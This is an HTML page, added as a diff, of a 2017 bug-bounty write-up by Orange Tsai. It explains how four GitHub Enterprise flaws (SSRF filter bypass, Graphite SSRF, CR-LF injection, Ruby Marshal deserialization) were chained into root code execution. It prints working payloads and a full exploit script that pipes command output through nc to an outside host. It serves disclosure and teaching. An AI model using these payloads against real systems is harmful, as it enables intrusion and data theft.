@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Hi, it’s been a long time since my last blog post. In the past few months, I spent lots of time preparing for the talk of Black Hat USA 2017 and DEF CON 25. Being a Black Hat and DEFCON speaker is par">
+<meta property="og:type" content="article">
+<meta property="og:title" content="How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!">
+<meta property="og:url" content="http://blog.orange.tw/posts/2017-07-how-i-chained-4-vulnerabilities-on/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="Hi, it’s been a long time since my last blog post. In the past few months, I spent lots of time preparing for the talk of Black Hat USA 2017 and DEF CON 25. Being a Black Hat and DEFCON speaker is par">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://blog.orange.tw/posts/2017-07-how-i-chained-4-vulnerabilities-on/a33aaef22889641a-01.png">
+<meta property="article:published_time" content="2017-07-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-20T11:01:02.890Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.orange.tw/posts/2017-07-how-i-chained-4-vulnerabilities-on/a33aaef22889641a-01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-07-27T16:00:00.000Z" class="dt-published" itemprop="datePublished">2017-07-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Hi, it’s been a long time since my last blog post.</p>
+<p>In the past few months, I spent lots of time preparing for the talk of <a target="_blank" rel="noopener" href="https://www.blackhat.com/us-17/speakers/Orange-Tsai.html">Black Hat USA 2017</a> and <a target="_blank" rel="noopener" href="https://www.defcon.org/html/defcon-25/dc-25-speakers.html">DEF CON 25</a>. Being a Black Hat and DEFCON speaker is part of my life goal ever. This is also my first English talk in such formal conferences. It’s really a memorable experience :P</p>
+<p>Thanks Review Boards for the acceptance.</p>
+<p>This post is a simple case study in my talk. The techniques here are old, but I’ll show you just how powerful those old tricks can be! If you are interested in, you can check slides here:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser inTrending Programming Languages!</a></li>
+</ul>
+<p>The slides covered even more powerful new approaches on SSRF and other techniques not included in this article.</p>
+<p>In this article, I will show you a beautiful exploit chain that chained 4 vulnerabilities into a Remote Code Execution(RCE) on GitHub Enterprise. It also be rewarded for the <a target="_blank" rel="noopener" href="https://github.com/blog/2332-bug-bounty-third-anniversary-wrap-up">Best Report</a> in GitHub 3rd Bug Bounty Anniversary Promotion!</p>
+<h1 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h1><p>In my last <a href="http://blog.orange.tw/2017/01/bug-bounty-github-enterprise-sql-injection.html">blog post</a>, I mentioned that the new target - GitHub Enterprise, also demonstrated how to de-obfuscate Ruby code and find SQL Injection on it. After that, I see several bounty hunters start to pay attentions on GitHub Enterprise and find lots of amazing bugs, like:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.economyofmechanism.com/github-saml">The road to your codebase is paved with forged assertions</a> by <a target="_blank" rel="noopener" href="https://twitter.com/ilektrojohn">ilektrojohn</a></li>
+<li><a target="_blank" rel="noopener" href="http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html">GitHub Enterprise Remote Code Execution</a> by <a target="_blank" rel="noopener" href="https://twitter.com/iblueconnection">iblue</a></li>
+</ul>
+<p>Seeing those writeups, I got a little frustrated and blame myself why I didn’t notice that :(</p>
+<p>Therefore, I have made up my mind to find a critical vulnerability that no one have found.</p>
+<p>Of course, in my own way!</p>
+<h1 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h1><p>Before I examine the architecture of GitHub Enterprise. My intuition tells me, there are so many internal services inside GitHub Enterprise. If I can play with them, I believe I have confidences to find something interesting.</p>
+<p>So, I am focusing on finding Server Side Request Forgery(SSRF) vulnerability more.</p>
+<h2 id="First-Bug-Harmless-SSRF"><a href="#First-Bug-Harmless-SSRF" class="headerlink" title="First Bug - Harmless SSRF"></a>First Bug - Harmless SSRF</h2><p>While playing GitHub Enterprise, I notice that there is an interesting feature called <code>WebHook</code>. It can define a custom HTTP callback when specific GIT command occurs.</p>
+<p>You can create a HTTP callback from the URL:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;host&gt;/&lt;user&gt;/&lt;repo&gt;/settings/hooks/new</span><br></pre></td></tr></table></figure>
+
+
+
+<p>And trigger it by committing files. Thus, GitHub Enterprise will notify you with a HTTP request. The  payload and the request look like bellow:</p>
+<p>Payload URL:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://orange.tw/foo.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>Callback Request:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/foo.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>orange.tw</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>GitHub-Hookshot/54651ac</span><br><span class="line"><span class="attribute">X-GitHub-Event</span><span class="punctuation">: </span>ping</span><br><span class="line"><span class="attribute">X-GitHub-Delivery</span><span class="punctuation">: </span>f4c41980-e17e-11e6-8a10-c8158631728f</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8972</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">payload</span><span class="operator">=</span>...</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>GitHub Enterprise uses Ruby Gem <code>faraday</code> to fetch external resources and prevents users from requesting internal services by Gem <code>faraday-restrict-ip-addresses</code>.</p>
+<p>The Gem seems to be just a blacklist and can be easily bypassed by the Rare IP Address Formats defined in <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc3986#section-7.4">RFC 3986</a>. In Linux, the <code>0</code> represented <code>localhost</code></p>
+<p>PoC:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0/</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>OK, we got a SSRF now. However, we still can’t do anything. Why?</p>
+<p>There are several limitations in this SSRF, such as:</p>
+<ul>
+<li>Only POST method</li>
+<li>Only allowed HTTP and HTTPS scheme</li>
+<li>No 302 redirection</li>
+<li>No CR-LF Injection in <code>faraday</code></li>
+<li>Couldn’t control the POST data and HTTP headers</li>
+</ul>
+<p>The only thing we can control is Path part.</p>
+<p>But, It’s still worth to mentioned that this SSRF can lead to Denied of Service(DoS). </p>
+<p>There is an Elasticsearch service bound on port 9200. In the <code>shutdown</code> command, Elasticsearch doesn’t care about whatever the POST data is. Therefore, you can play its REST-ful API for fun :P</p>
+<p>Denied of Service PoC:</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0:9200/<span class="emphasis">_shutdown/</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="Second-Bug-SSRF-in-Internal-Graphite"><a href="#Second-Bug-SSRF-in-Internal-Graphite" class="headerlink" title="Second Bug - SSRF in Internal Graphite"></a>Second Bug - SSRF in Internal Graphite</h2><p>We have a SSRF now, with lots of limitations. What can I do? My next idea is - Is there any Intranet services we can leverage?</p>
+<p>It’s a big work. There are several HTTP services inside, and each service based on different language implementations like C &#x2F; C++, Go, Python and Ruby…</p>
+<p>With a couple of days digging. I find there is a service called <code>Graphite</code> on port 8000. <code>Graphite</code> is a highly scalable real-time graphing system and GitHub uses this system to show some statistics to users. </p>
+<p><code>Graphite</code> is written in Python and also a open-source project, you can download the source code <a target="_blank" rel="noopener" href="https://github.com/graphite-project/graphite-web">here</a>!</p>
+<p>From reading the source, I quickly find another SSRF here. The second SSRF is simple.</p>
+<p>In file <code>webapps/graphite/composer/views.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send_email</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        recipients = request.GET[<span class="string">&#x27;to&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        url = request.GET[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">        proto, server, path, query, frag = urlsplit(url)</span><br><span class="line">        <span class="keyword">if</span> query: path += <span class="string">&#x27;?&#x27;</span> + query</span><br><span class="line">        conn = HTTPConnection(server)</span><br><span class="line">        conn.request(<span class="string">&#x27;GET&#x27;</span>,path)</span><br><span class="line">        resp = conn.getresponse()</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>You can see <code>Graphite</code> receive the user input <code>url</code> and just fetch it! So, we can use the first SSRF to trigger the second SSRF and combine them into a <strong>SSRF execution chain</strong>.</p>
+<p>The SSRF execution chain payload:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">0</span>:<span class="number">8000</span>/composer/send_email?</span><br><span class="line">to=orange<span class="variable">@nogg</span>&amp;</span><br><span class="line">url=http:<span class="regexp">//</span>orange.tw:<span class="number">12345</span>/foo</span><br></pre></td></tr></table></figure>
+
+
+
+<p>The request of second SSRF</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -vvlp 12345</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Host: orange.tw:12345</span><br><span class="line">Accept-Encoding: identity</span><br></pre></td></tr></table></figure>
+
+
+
+<p>OK, we successfully change the POST-based SSRF into a GET-based SSRF. But still can’t do anything.</p>
+<p>Let’s go to next stage!</p>
+<h2 id="Third-Bug-CR-LF-Injection-in-Python"><a href="#Third-Bug-CR-LF-Injection-in-Python" class="headerlink" title="Third Bug - CR-LF Injection in Python"></a>Third Bug - CR-LF Injection in Python</h2><p>As you can see, <code>Graphite</code> uses Python <code>httplib.HTTPConnection</code> to fetch the resources. With some trials and errors, I notice that there is a CR-LF Injection in <code>httplib.HTTPConnection</code>. Therefore, we have the ability to embed malicious payloads in HTTP protocol.</p>
+<p><strong>CR-LF Injection PoC</strong></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">0</span>:<span class="number">8000</span>/composer/send_email?</span><br><span class="line">to=orange<span class="variable">@nogg</span>&amp;</span><br><span class="line">url=http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">12345</span>/%0D<span class="variable">%0Ai_am</span>_payload%0D<span class="variable">%0AFoo</span>:</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nc -vvlp 12345</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">GET /</span><br><span class="line">i<span class="emphasis">_am_</span>payload</span><br><span class="line">Foo: HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:12345</span><br><span class="line">Accept-Encoding: identity</span><br></pre></td></tr></table></figure>
+
+
+
+<p>This is one small step, but it become a giant leap for whole the exploit chain. Now, I can smuggle other protocols in this SSRF Execution Chain. For example, If we want to play with Redis, we can try following payload:</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://0:8000/composer/send<span class="emphasis">_email?</span></span><br><span class="line"><span class="emphasis">to=orange@nogg&amp;</span></span><br><span class="line"><span class="emphasis">url=http://127.0.0.1:6379/%0ASLAVEOF%20orange.tw%206379%0A</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>P.s. The SLAVEOF is a very nice command that you can make out-bound traffics. This is a useful trick when you are facing some Blind-SSRF!</p>
+<p>That’s look great! However, there are also some limitations in protocol smuggling</p>
+<ol>
+<li>Protocols with handshakes like SSH, MySQL and SSL will fail</li>
+<li>The payload we used in second SSRF only allowed bytes from 0x00 to 0x8F due to the <code>Python2</code></li>
+</ol>
+<p>By the way, there is more than one way to smuggle protocols in the HTTP scheme. In my slides, I also show that how to use the features in Linux Glibc to smuggle protocols over SSL SNI, and a case study in bypassing Python CVE-2016-5699!</p>
+<p>Check it, if you are interested :)</p>
+<h2 id="Fourth-Bug-Unsafe-Deserialization"><a href="#Fourth-Bug-Unsafe-Deserialization" class="headerlink" title="Fourth Bug - Unsafe Deserialization"></a>Fourth Bug - Unsafe Deserialization</h2><p>For now, we have the ability to smuggle other protocols in a HTTP protocol, but the next problem is, what protocol do I choose to smuggle?</p>
+<p>I spend lots of time to find out what vulnerabilities can be triggered if I can control the Redis or Memcached. </p>
+<p>While reviewing the source. I am curious about why GitHub can store Ruby Objects in Memcached. After some digging, I find GitHub Enterprise uses Ruby Gem <code>memcached</code> to handle caches, and the cache was wrapped by Marshal.</p>
+<p>It’s a good news to me. Everyone know that Marshal is dangerous. </p>
+<p>(If you don’t know, I recommend you read the slides <a target="_blank" rel="noopener" href="https://frohoff.github.io/appseccali-marshalling-pickles/">Marshalling Pickles</a> by <a target="_blank" rel="noopener" href="https://twitter.com/frohoff">@frohoff</a> and <a target="_blank" rel="noopener" href="https://twitter.com/gebl">@gebl</a> from AppSec California 2015)</p>
+<p>So, our our goal is clear. </p>
+<p>We use our SSRF execution chain to store malicious Ruby Objects in Memcached. The next time GitHub fetches the cache, Ruby Gem <code>memcached</code> will de-serialize the data automatically. And the result is… BOOM! Remote Code Execution! XD</p>
+<p>Unsafe Marshal in Rails Console</p>
+<figure class="highlight irb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">irb(main):001:0&gt;</span> <span class="title class_">GitHub</span>.cache.<span class="keyword">class</span>.superclass</span><br><span class="line">=&gt; <span class="title class_">Memcached</span><span class="symbol">:</span><span class="symbol">:Rails</span></span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">irb(main):002:0&gt;</span> <span class="title class_">GitHub</span>.cache.set(<span class="string">&quot;nogg&quot;</span>, <span class="string">&quot;hihihi&quot;</span>)</span><br><span class="line">=&gt; true</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">irb(main):003:0&gt;</span> <span class="title class_">GitHub</span>.cache.get(<span class="string">&quot;nogg&quot;</span>)</span><br><span class="line">=&gt; <span class="string">&quot;hihihi&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">irb(main):004:0&gt;</span> <span class="title class_">GitHub</span>.cache.get(<span class="string">&quot;nogg&quot;</span>, <span class="symbol">:raw=&gt;true</span>)</span><br><span class="line">=&gt; <span class="string">&quot;\x04\bI\&quot;\vhihihi\x06:\x06ET&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">irb(main):005:0&gt;</span> code = <span class="string">&quot;`id`&quot;</span></span><br><span class="line">=&gt; <span class="string">&quot;`id`&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">irb(main):006:0&gt;</span> payload = <span class="string">&quot;\x04\x08&quot;</span> + <span class="string">&quot;o&quot;</span>+<span class="string">&quot;:\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy&quot;</span>+<span class="string">&quot;\x07&quot;</span> + <span class="string">&quot;:\x0E@instance&quot;</span> + <span class="string">&quot;o&quot;</span>+<span class="string">&quot;:\x08ERB&quot;</span>+<span class="string">&quot;\x07&quot;</span> + <span class="string">&quot;:\x09@src&quot;</span> + <span class="title class_">Marshal</span>.dump(code)[<span class="number">2</span>..-<span class="number">1</span>] + <span class="string">&quot;:\x0c@lineno&quot;</span>+ <span class="string">&quot;i\x00&quot;</span> + <span class="string">&quot;:\x0C@method&quot;</span>+<span class="string">&quot;:\x0Bresult&quot;</span></span><br><span class="line">=&gt; <span class="string">&quot;\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\u000E@instanceo:\bERB\a:\t@srcI\&quot;\t`id`\u0006:\u0006ET:\f@linenoi\u0000:\f@method:\vresult&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">irb(main):007:0&gt;</span> <span class="title class_">GitHub</span>.cache.set(<span class="string">&quot;nogg&quot;</span>, payload, <span class="number">60</span>, <span class="symbol">:raw=&gt;true</span>)</span><br><span class="line">=&gt; true</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">irb(main):008:0&gt;</span> <span class="title class_">GitHub</span>.cache.get(<span class="string">&quot;nogg&quot;</span>)</span><br><span class="line">=&gt; <span class="string">&quot;uid=0(root) gid=0(root) groups=0(root)\n&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>OK, let’s summarize our steps!</p>
+<ol>
+<li>First SSRF - Bypass the existing protection in <code>Webhook</code></li>
+<li>Second SSRF - SSRF in <code>Graphite</code>service</li>
+<li>Chained first SSRF and second SSRF into a SSRF execution chain</li>
+<li>CR-LF Injection in the SSRF execution chain</li>
+<li>Smuggled as Memcached protocol and insert a malicious Marshal Object</li>
+<li>Triggered RCE</li>
+</ol>
+<p>Exploit in a Nutshell</p>
+<p><img src="/posts/2017-07-how-i-chained-4-vulnerabilities-on/a33aaef22889641a-01.png"></p>
+<p>The final exploit you can find on <a target="_blank" rel="noopener" href="https://gist.github.com/orangetw/bbd592f5a32c59bbefefb3195c2df383">Gist</a> and video on <a target="_blank" rel="noopener" href="https://youtu.be/GoO7_lCOfic">Youtube</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; set up the marshal payload from IRB</span></span><br><span class="line"><span class="string">code = &quot;`id | nc orange.tw 12345`&quot;</span></span><br><span class="line"><span class="string">p &quot;\x04\x08&quot; + &quot;o&quot;+&quot;:\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy&quot;+&quot;\x07&quot; + &quot;:\x0E@instance&quot; + &quot;o&quot;+&quot;:\x08ERB&quot;+&quot;\x07&quot; + &quot;:\x09@src&quot; + Marshal.dump(code)[2..-1] + &quot;:\x0c@lineno&quot;+ &quot;i\x00&quot; + &quot;:\x0C@method&quot;+&quot;:\x0Bresult&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">marshal_code = <span class="string">&#x27;\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0e@instanceo:\x08ERB\x07:\t@srcI&quot;\x1e`id | nc orange.tw 12345`\x06:\x06ET:\x0c@linenoi\x00:\x0c@method:\x0bresult&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d&#x27;</span> % <span class="built_in">len</span>(marshal_code),</span><br><span class="line">    marshal_code,</span><br><span class="line">    <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">map</span>(quote, payload)</span><br><span class="line">url = <span class="string">&#x27;http://0:8000/composer/send_email?to=orange@chroot.org&amp;url=http://127.0.0.1:11211/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nGitHub Enterprise &lt; 2.8.7 Remote Code Execution by orange@chroot.org&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;-&#x27;</span>*<span class="number">10</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="built_in">print</span> url + <span class="string">&#x27;%0D%0A&#x27;</span>.join(payload)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Inserting WebHooks from:</span></span><br><span class="line"><span class="string">https://ghe-server/:user/:repo/settings/hooks</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Triggering RCE from:</span></span><br><span class="line"><span class="string">https://ghe-server/search?q=ggggg&amp;type=Repositories</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="The-Fix"><a href="#The-Fix" class="headerlink" title="The Fix"></a>The Fix</h1><p>GitHub had made a number of improvements to prevent related issues again!</p>
+<ol>
+<li>Enhanced the Gem <code>faraday-restrict-ip-addresses</code></li>
+<li>Applied a custom Django middleware to ensure attackers can’t reach path outside <code>http://127.0.0.1:8000/render/</code></li>
+<li>Enhanced <code>iptables</code> rules that block access with pattern <code>User-Agent: GitHub-Hookshot</code></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /etc/ufw/before.rules</span><br><span class="line">...</span><br><span class="line">-A ufw-before-input -m multiport -p tcp ! --dports 22,23,80,81,122,123,443,444,8080,8081,8443,8444 -m recent --tcp-flags PSH,ACK PSH,ACK --remove -m string --algo bm --string <span class="string">&quot;User-Agent: GitHub-Hookshot&quot;</span> -j REJECT --reject-with tcp-reset</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><ul>
+<li>2017&#x2F;01&#x2F;23 23:22 Report the vulnerability to GitHub via HackerOne, report number <a target="_blank" rel="noopener" href="https://hackerone.com/reports/200542">200542</a> assigned</li>
+<li>2017&#x2F;01&#x2F;23 23:37 GitHub changed the status to Triaged.</li>
+<li>2017&#x2F;01&#x2F;24 04:43 GitHub responses that the issue validated and working on a fix.</li>
+<li>2017&#x2F;01&#x2F;31 14:01 GitHub Enterprise 2.8.7 released.</li>
+<li>2017&#x2F;02&#x2F;01 01:02 GitHub response that this issue have been fixed!</li>
+<li>2017&#x2F;02&#x2F;01 01:02 GitHub rewarded $7,500 USD bounty!</li>
+<li>2017&#x2F;03&#x2F;15 02:38 GitHub rewarded $5,000 USD for the best report bonus.</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
